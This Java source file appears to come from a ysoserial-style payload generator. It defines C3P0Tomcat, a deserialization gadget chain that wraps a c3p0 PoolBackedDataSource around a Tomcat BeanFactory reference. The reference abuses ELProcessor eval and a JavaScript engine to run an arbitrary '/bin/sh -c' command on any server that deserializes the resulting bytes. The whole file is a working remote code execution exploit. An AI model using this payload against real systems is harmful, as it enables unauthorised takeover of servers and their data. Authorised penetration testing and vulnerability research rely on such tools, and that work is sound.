package payloads;


import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import org.apache.naming.ResourceRef;
import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import util.PayloadRunner;
import util.Reflections;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;


/**
 *
 * @author yulegeyu
 *
 */
@Dependencies( { "tomcat", "com.mchange:c3p0:0.9.5.2", "com.mchange:mchange-commons-java:0.2.11"} )
@Authors({ Authors.YULEGEYU })
public class C3P0Tomcat implements ObjectPayload<Object> {
    public Object getObject ( String command ) throws Exception {

        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource("org.apache.naming.factory.BeanFactory", null, command));
        return b;
    }

    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private String className;
        private String url;
        private String command;

        public PoolSource ( String className, String url, String command ) {
            this.className = className;
            this.url = url;
            this.command = command;
        }

        public Reference getReference () throws NamingException {
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
            ref.add(new StringRefAddr("forceString", "x=eval"));
            String cmd = this.command;
            ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','"+ cmd +"']).start()\")"));
            return ref;
        }

        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
        public PooledConnection getPooledConnection () throws SQLException {return null;}
        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}

    }

    public static byte[] getBytes (final String command, Boolean fusion) throws Exception {
        return PayloadRunner.run(C3P0Tomcat.class, command, fusion);
    }
}
